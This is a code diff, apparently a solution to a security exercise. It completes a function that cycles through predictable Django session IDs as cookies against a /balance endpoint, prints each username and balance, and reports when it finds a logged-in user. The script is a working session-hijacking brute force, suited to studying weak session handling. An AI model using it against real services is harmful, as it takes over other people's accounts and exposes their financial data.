@@ -2,11 +2,37 @@ import sys
 import requests
 import json
 
-
 def test_session(address):
-	# write your code here
-	return None
+    django_session = 'sessionid'
+    session_guess_base = 'session-'
 
+    test_req = requests.get(f'{address}/')
+    token = test_req.cookies.get('csrftoken')
+
+    for guess in range(1, 11):
+        guessed_session = f'{session_guess_base}{guess}'
+        cookies = {django_session: guessed_session}
+        
+        if token:
+            cookies['csrftoken'] = token
+
+        try:
+            r = requests.get(f'{address}/balance', cookies=cookies)
+            response_json = r.json()
+            username = response_json.get('username', 'anonymous')
+
+            print(f'Guess {guess}: session={guessed_session}')
+            print(f"Username: {response_json['username']}\n{'-'*40}")
+            print(f"Balance: {response_json['balance']}\n{'-'*40}")
+
+            if username != 'anonymous':
+                print("Valid session found!")
+                return guess
+        except Exception as e:
+            print(f'Error: {e}')
+
+    print("No valid session found.")
+    return guess
 
 
 def main(argv):
